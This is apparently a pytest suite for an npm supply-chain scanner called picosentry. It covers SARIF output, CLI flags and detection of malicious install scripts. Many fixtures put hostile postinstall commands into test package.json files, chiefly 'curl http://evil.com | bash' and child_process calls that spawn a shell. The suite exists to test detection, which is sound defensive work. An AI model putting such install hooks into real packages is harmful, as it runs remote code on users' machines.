"""
test_cli.py — CLI integration and SARIF format validation tests.

Tests the command-line interface and SARIF output format.
"""

import json
import subprocess
import sys
from pathlib import Path

import pytest

from picosentry.scan.engine import create_default_engine
from picosentry.scan.formatters import format_sarif
from picosentry.scan.models import Confidence, Finding, ScanResult, ScanStats, Severity

from tests.scan.conftest import FIXTURES_DIR, make_npm_project as _make_project


class TestSARIFOutput:
    """Validate SARIF v2.1.0 output format."""

    def test_sarif_schema_and_version(self):
        """SARIF output must include $schema and version 2.1.0."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="Post-install script",
                    evidence="scripts.postinstall",
                    remediation="Remove script",
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif_str = format_sarif(result)
        sarif = json.loads(sarif_str)

        assert (
            sarif["$schema"]
            == "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json"
        )
        assert sarif["version"] == "2.1.0"

    def test_sarif_has_tool_driver(self):
        """SARIF output must have tool.driver with name and version."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[],
            stats=ScanStats(packages_scanned=0, files_scanned=0, duration_ms=50),
        )
        sarif = json.loads(format_sarif(result))

        driver = sarif["runs"][0]["tool"]["driver"]
        assert driver["name"] == "picosentry"
        assert driver["version"] == "0.2.0"

    def test_sarif_finding_level_mapping(self):
        """SARIF level must map CRITICAL/HIGH→error, MEDIUM→warning, LOW/INFO→note."""
        findings = [
            Finding(
                rule_id="L2-POST-001",
                severity=Severity.CRITICAL,
                confidence=Confidence.EXACT,
                package="a@1.0",
                file="a.json",
                message="critical",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-OBFS-001",
                severity=Severity.HIGH,
                confidence=Confidence.EXACT,
                package="b@1.0",
                file="b.json",
                message="high",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-LOCK-001",
                severity=Severity.MEDIUM,
                confidence=Confidence.MEDIUM,
                package="c@1.0",
                file="c.json",
                message="medium",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-TYPO-001",
                severity=Severity.LOW,
                confidence=Confidence.LOW,
                package="d@1.0",
                file="d.json",
                message="low",
                evidence="e",
                remediation="r",
            ),
        ]
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=findings,
            stats=ScanStats(packages_scanned=4, files_scanned=40, duration_ms=200),
        )
        sarif = json.loads(format_sarif(result))
        levels = {r["ruleId"]: r["level"] for r in sarif["runs"][0]["results"]}

        assert levels["L2-POST-001"] == "error"
        assert levels["L2-OBFS-001"] == "error"
        assert levels["L2-LOCK-001"] == "warning"
        assert levels["L2-TYPO-001"] == "note"

    def test_sarif_rule_definitions(self):
        """SARIF must include rule definitions with metadata from RULE_INFO."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="Post-install script",
                    evidence="scripts.postinstall",
                    remediation="Remove script",
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif = json.loads(format_sarif(result))

        rules = sarif["runs"][0]["tool"]["driver"]["rules"]
        assert len(rules) == 1
        assert rules[0]["id"] == "L2-POST-001"
        assert "name" in rules[0]
        assert "shortDescription" in rules[0]
        assert rules[0]["properties"]["category"] in (
            "execution",
            "dependency",
            "obfuscation",
            "credential",
            "provenance",
            "lockfile",
            "typosquat",
            "manifest",
            "maintainer",
        )

    def test_sarif_references_included(self):
        """SARIF finding with references must include them in properties."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="Post-install script",
                    evidence="scripts.postinstall",
                    remediation="Remove script",
                    references=["https://example.com/advisory"],
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif = json.loads(format_sarif(result))
        props = sarif["runs"][0]["results"][0]["properties"]
        assert "references" in props
        assert "https://example.com/advisory" in props["references"]

    def test_sarif_deterministic_output(self):
        """Two SARIF outputs from same input must be byte-identical."""
        findings = [
            Finding(
                rule_id="L2-POST-001",
                severity=Severity.HIGH,
                confidence=Confidence.EXACT,
                package="evil@1.0.0",
                file="evil/package.json",
                message="Post-install script",
                evidence="scripts.postinstall",
                remediation="Remove script",
            ),
            Finding(
                rule_id="L2-OBFS-001",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                package="obf@2.0.0",
                file="obf/index.js",
                message="eval() usage",
                evidence="eval(atob('...'))",
                remediation="Remove eval",
            ),
        ]
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=findings,
            stats=ScanStats(packages_scanned=2, files_scanned=20, duration_ms=150),
        )
        sarif_a = format_sarif(result)
        sarif_b = format_sarif(result)
        assert sarif_a == sarif_b

    def test_sarif_sorted_keys(self):
        """SARIF JSON must have sorted keys for determinism."""
        result = ScanResult(
            target="/tmp/test",
            engine_version="0.2.0",
            corpus_version="abc123",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="test",
                    evidence="e",
                    remediation="r",
                ),
            ],
            stats=ScanStats(packages_scanned=1, files_scanned=10, duration_ms=100),
        )
        sarif_str = format_sarif(result)
        parsed = json.loads(sarif_str)
        # Re-serialize with sorted_keys — must be identical
        reserialized = json.dumps(parsed, sort_keys=True, indent=2)
        assert sarif_str == reserialized


class TestCLIIntegration:
    """Test CLI commands end-to-end."""

    def test_version_command(self):
        """`picosentry version` should print version info."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "version"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 0
        assert "PicoSentry (unified) v" in result.stdout
        assert "scan:" in result.stdout
        assert "sandbox:" in result.stdout

    def test_rules_command(self):
        """`picosentry rules` should list all 12+ rules."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "rules"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 0
        # Should list all rules
        assert "L2-POST-001" in result.stdout
        assert "L2-TYPO-001" in result.stdout
        assert "L2-OBFS-001" in result.stdout

    def test_rules_json_command(self):
        """`picosentry rules --json` should produce valid JSON."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "rules", "--json"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 0
        data = json.loads(result.stdout)
        assert isinstance(data, list)
        assert len(data) >= 12
        assert all("rule_id" in r for r in data)
        assert all("name" in r for r in data)

    def test_scan_clean_project(self):
        """Scanning clean project should exit 0 with --exit-code."""
        fixture = FIXTURES_DIR / "clean_project"
        if not fixture.is_dir():
            pytest.skip("clean_project fixture not available")

        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(fixture), "--exit-code"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        # Clean project should have no CRITICAL/HIGH findings
        # but may have LOW/INFO, so exit code depends on findings
        assert result.returncode in (0, 1)

    def test_scan_malicious_project_exit_code(self):
        """Scanning malicious project with --exit-code should exit 1."""
        fixture = FIXTURES_DIR / "shai_hulud"
        if not fixture.is_dir():
            pytest.skip("shai_hulud fixture not available")

        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(fixture), "--exit-code"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert result.returncode == 1

    def test_scan_json_format(self):
        """`--format json` should produce valid JSON with expected fields."""
        fixture = FIXTURES_DIR / "shai_hulud"
        if not fixture.is_dir():
            pytest.skip("shai_hulud fixture not available")

        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(fixture), "--format", "json"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert result.returncode == 0
        data = json.loads(result.stdout)
        assert "scan_id" in data
        assert "findings" in data
        assert "stats" in data
        assert "corpus_version" in data
        assert len(data["findings"]) > 0

    def test_scan_sarif_format(self):
        """`--format sarif` should produce valid SARIF v2.1.0."""
        fixture = FIXTURES_DIR / "shai_hulud"
        if not fixture.is_dir():
            pytest.skip("shai_hulud fixture not available")

        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(fixture), "--format", "sarif"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert result.returncode == 0
        sarif = json.loads(result.stdout)
        assert sarif["version"] == "2.1.0"
        assert "runs" in sarif
        assert len(sarif["runs"]) > 0

    def test_scan_ml_context_format(self):
        """`--format ml-context` should produce compact output."""
        fixture = FIXTURES_DIR / "shai_hulud"
        if not fixture.is_dir():
            pytest.skip("shai_hulud fixture not available")

        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(fixture), "--format", "ml-context"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert result.returncode == 0
        # ml-context should be compact — no long prose
        lines = result.stdout.strip().split("\n")
        assert len(lines) > 0
        assert any("scan_id=" in line for line in lines)

    def test_scan_specific_rules(self):
        """`--rules L2-POST-001 L2-TYPO-001` should only run those rules."""
        fixture = FIXTURES_DIR / "shai_hulud"
        if not fixture.is_dir():
            pytest.skip("shai_hulud fixture not available")

        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(fixture),
                "--format",
                "json",
                "--rules",
                "L2-POST-001",
                "L2-TYPO-001",
            ],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert result.returncode == 0
        data = json.loads(result.stdout)
        rule_ids = {f["rule_id"] for f in data["findings"]}
        # Should only have the requested rules
        assert rule_ids.issubset({"L2-POST-001", "L2-TYPO-001"})

    def test_scan_output_to_file(self, tmp_path):
        """`--output file` should write to file."""
        fixture = FIXTURES_DIR / "clean_project"
        if not fixture.is_dir():
            pytest.skip("clean_project fixture not available")

        output_file = tmp_path / "output.json"
        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(fixture),
                "--format",
                "json",
                "--output",
                str(output_file),
            ],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert result.returncode == 0
        assert output_file.is_file()
        data = json.loads(output_file.read_text())
        assert "scan_id" in data

    def test_scan_nonexistent_path(self):
        """Scanning nonexistent path should exit 2."""
        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", "/nonexistent/path/that/does/not/exist"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert result.returncode == 2

    def test_fail_on_critical_no_critical(self):
        """--fail-on critical should exit 0 when no critical findings."""
        fixture = FIXTURES_DIR / "clean_project"
        if not fixture.is_dir():
            pytest.skip("clean_project fixture not available")

        result = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(fixture), "--fail-on", "critical"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        # Clean project has no CRITICAL findings
        assert result.returncode == 0


class TestPostInstallExecDetection:
    """L2-POST-001: child_process and exec pattern detection."""

    def test_child_process_in_postinstall_escalates_to_critical(self, tmp_path):
        """Script containing child_process.exec should escalate to CRITICAL."""
        project = _make_project(
            tmp_path,
            {
                "name": "exec-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node -e \"require('child_process').exec('whoami')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project, project.parent)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in post_findings), (
            f"Expected CRITICAL for child_process, got: {[f.severity for f in post_findings]}"
        )

    def test_exec_sync_in_install_script_escalates(self, tmp_path):
        """Script containing .execSync( should escalate to CRITICAL."""
        project = _make_project(
            tmp_path,
            {
                "name": "execsync-pkg",
                "version": "1.0.0",
                "scripts": {
                    "install": "node -e \"require('child_process').execSync('id')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project, project.parent)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in post_findings)

    def test_spawn_in_script_escalates(self, tmp_path):
        """Script containing .spawn( should escalate to CRITICAL."""
        project = _make_project(
            tmp_path,
            {
                "name": "spawn-pkg",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "node -e \"require('child_process').spawn('sh')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project, project.parent)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in post_findings)

    def test_benign_postinstall_stays_high(self, tmp_path):
        """Script without network/cred/exec patterns should stay HIGH."""
        project = _make_project(
            tmp_path,
            {
                "name": "benign-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "echo 'Installed successfully'",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project, project.parent)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        assert all(f.severity == Severity.HIGH for f in post_findings), (
            f"Benign postinstall should be HIGH, got: {[f.severity for f in post_findings]}"
        )

    def test_remediation_mentions_risk_tags(self, tmp_path):
        """CRITICAL finding should mention specific risk tags in remediation."""
        project = _make_project(
            tmp_path,
            {
                "name": "risk-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl http://evil.com | bash",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project, project.parent)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        assert len(post_findings) >= 1
        critical = [f for f in post_findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert "network access" in critical[0].remediation.lower(), (
            f"Expected 'network access' in remediation, got: {critical[0].remediation}"
        )

    def test_exec_remediation_mentions_child_process(self, tmp_path):
        """CRITICAL finding with child_process should mention it in remediation."""
        project = _make_project(
            tmp_path,
            {
                "name": "exec-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node -e \"require('child_process').exec('id')\"",
                },
            },
        )
        from picosentry.scan.rules.post_install import detect_post_install_scripts

        findings = detect_post_install_scripts(project, project.parent)
        post_findings = [f for f in findings if f.rule_id == "L2-POST-001"]
        critical = [f for f in post_findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert "child_process" in critical[0].remediation.lower(), (
            f"Expected 'child_process' in remediation, got: {critical[0].remediation}"
        )


class TestDiffCommand:
    """Test the 'diff' CLI command for determinism verification."""

    def test_diff_identical_scans(self, tmp_path):
        """Two identical scans should produce exit code 0."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        engine = create_default_engine()
        project = _make_project(
            project_dir,
            {
                "name": "test-diff",
                "version": "1.0.0",
                "license": "MIT",
            },
        )
        result_a = engine.scan(project)
        result_b = engine.scan(project)

        scan_a = tmp_path / "scan_a.json"
        scan_b = tmp_path / "scan_b.json"
        scan_a.write_text(result_a.to_json())
        scan_b.write_text(result_b.to_json())

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), str(scan_b)],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0
        assert "IDENTICAL" in proc.stdout

    def test_diff_different_scans(self, tmp_path):
        """Two different scans should produce exit code 1."""
        dir_a = tmp_path / "project_a"
        dir_b = tmp_path / "project_b"
        dir_a.mkdir()
        dir_b.mkdir()
        project_a = _make_project(
            dir_a,
            {
                "name": "pkg-a",
                "version": "1.0.0",
                "license": "MIT",
            },
        )
        project_b = _make_project(
            tmp_path / "project_b",
            {
                "name": "pkg-b",
                "version": "2.0.0",
                "license": "GPL-3.0",
            },
        )

        engine = create_default_engine()
        result_a = engine.scan(project_a)
        result_b = engine.scan(project_b)

        scan_a = tmp_path / "scan_a.json"
        scan_b = tmp_path / "scan_b.json"
        scan_a.write_text(result_a.to_json())
        scan_b.write_text(result_b.to_json())

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), str(scan_b)],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1
        assert "DIFFER" in proc.stdout

    def test_diff_nonexistent_file(self, tmp_path):
        """Diff with nonexistent file should exit 2."""
        scan_a = tmp_path / "exists.json"
        scan_a.write_text('{"scan_id": "test"}')

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), "/nonexistent/file.json"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 2

    def test_diff_verbose_shows_changes(self, tmp_path):
        """--verbose should show detailed finding differences."""
        dir_a = tmp_path / "project_a"
        dir_b = tmp_path / "project_b"
        dir_a.mkdir()
        dir_b.mkdir()
        project_a = _make_project(
            dir_a,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
            },
        )
        project_b = _make_project(
            tmp_path / "project_b",
            {
                "name": "gpl-pkg",
                "version": "1.0.0",
                "license": "GPL-3.0",
            },
        )

        engine = create_default_engine()
        result_a = engine.scan(project_a)
        result_b = engine.scan(project_b)

        scan_a = tmp_path / "scan_a.json"
        scan_b = tmp_path / "scan_b.json"
        scan_a.write_text(result_a.to_json())
        scan_b.write_text(result_b.to_json())

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "diff", str(scan_a), str(scan_b), "--verbose"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1


class TestQuietAndSummary:
    """Test --quiet and --summary CLI flags."""

    def test_summary_clean_project(self, tmp_path):
        """--summary on project with only minor findings should work."""
        project = _make_project(
            tmp_path,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
                "repository": {"type": "git", "url": "https://github.com/clean/clean-pkg"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--summary"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0
        assert "PicoSentry:" in proc.stdout

    def test_summary_with_findings(self, tmp_path):
        """--summary on malicious project should show pinch counts."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--summary"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert "HARD PINCH" in proc.stdout or "SOFT PINCH" in proc.stdout or "NUDGE" in proc.stdout

    def test_quiet_clean_project(self, tmp_path):
        """--quiet on project with only minor findings should show summary."""
        project = _make_project(
            tmp_path,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
                "repository": {"type": "git", "url": "https://github.com/clean/clean-pkg"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--quiet"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0
        assert "PicoSentry" in proc.stdout

    def test_quiet_with_findings(self, tmp_path):
        """--quiet on malicious project should show summary with rule counts."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--quiet"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert "finding(s)" in proc.stdout
        # Should show rule IDs
        assert "L2-POST-001" in proc.stdout

    def test_summary_implies_quiet(self, tmp_path):
        """--summary should produce one-line output."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--summary"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        # Summary should be a single line (plus possibly a newline)
        lines = [ln for ln in proc.stdout.strip().split("\n") if ln.strip()]
        assert len(lines) == 1

    def test_quiet_with_exit_code(self, tmp_path):
        """--quiet + --exit-code should still exit 1 on findings."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--quiet", "--exit-code"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1


class TestGitHubFormat:
    """Test --format github output (SARIF file + markdown summary)."""

    def test_github_format_creates_sarif_file(self, tmp_path):
        """--format github should write a SARIF file."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0 or proc.returncode == 1  # may have findings
        assert sarif_path.exists(), "SARIF file should be created"
        sarif_data = json.loads(sarif_path.read_text())
        assert sarif_data["version"] == "2.1.0"
        assert sarif_data["runs"][0]["tool"]["driver"]["name"] == "picosentry"

    def test_github_format_markdown_summary(self, tmp_path):
        """--format github should print markdown summary to stdout."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout
        assert "PicoSentry" in output
        assert "Engine" in output
        assert "Corpus" in output
        assert "SARIF" in output

    def test_github_format_clean_project(self, tmp_path):
        """--format github on clean project with no critical findings."""
        project = tmp_path / "project"
        project.mkdir()
        # Well-maintained package.json that minimizes findings
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "clean-app",
                    "version": "1.0.0",
                    "license": "MIT",
                    "author": "Test Author <test@example.com>",
                    "repository": {"type": "git", "url": "https://github.com/test/clean-app"},
                    "engines": {"node": ">=18.0.0"},
                }
            )
        )
        (project / "package-lock.json").write_text('{"name":"clean-app","lockfileVersion":1}')
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout
        # Either clean or only has low-severity findings
        assert "PicoSentry" in output
        assert "SARIF" in output

    def test_github_format_default_sarif_path(self, tmp_path):
        """--format github without --sarif-file defaults to sarif.json."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--format", "github"],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=str(tmp_path),
        )
        assert (tmp_path / "sarif.json").exists(), "Default sarif.json should be created in cwd"

    def test_github_format_with_exit_code(self, tmp_path):
        """--format github + --exit-code should exit 1 on findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
                "--exit-code",
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 1  # findings found

    def test_github_format_findings_table(self, tmp_path):
        """--format github should include findings table with rule IDs."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        sarif_path = tmp_path / "results.sarif"

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--format",
                "github",
                "--sarif-file",
                str(sarif_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout
        assert "L2-POST-001" in output
        assert "| Rule |" in output  # findings table header


class TestVerifyDeterminism:
    """Test --verify-determinism CLI flag."""

    def test_verify_determinism_clean_project(self, tmp_path):
        """--verify-determinism on a clean project should exit 0 (identical)."""
        project = _make_project(
            tmp_path,
            {
                "name": "clean-pkg",
                "version": "1.0.0",
                "license": "MIT",
                "repository": {"type": "git", "url": "https://github.com/clean/clean-pkg"},
                "engines": {"node": ">=18.0.0"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--verify-determinism"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0, f"Expected exit 0, got {proc.returncode}\nstderr: {proc.stderr}"
        assert "DETERMINISM VERIFIED" in proc.stderr

    def test_verify_determinism_malicious_project(self, tmp_path):
        """--verify-determinism on a project with findings should still exit 0 (deterministic)."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--verify-determinism"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0, f"Expected exit 0, got {proc.returncode}\nstderr: {proc.stderr}"
        assert "DETERMINISM VERIFIED" in proc.stderr

    def test_verify_determinism_shows_sha256(self, tmp_path):
        """--verify-determinism should show SHA-256 hashes on stderr."""
        project = _make_project(
            tmp_path,
            {
                "name": "test-sha",
                "version": "1.0.0",
                "license": "MIT",
            },
        )

        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--verify-determinism"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0
        assert "sha256=" in proc.stderr

    def test_verify_determinism_with_severity_threshold(self, tmp_path):
        """--verify-determinism should work with --severity-threshold."""
        project = _make_project(
            tmp_path,
            {
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            },
        )

        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "picosentry",
                "scan",
                str(project),
                "--verify-determinism",
                "--severity-threshold",
                "high",
            ],
            capture_output=True,
            text=True,
            timeout=120,
        )
        assert proc.returncode == 0
        assert "DETERMINISM VERIFIED" in proc.stderr
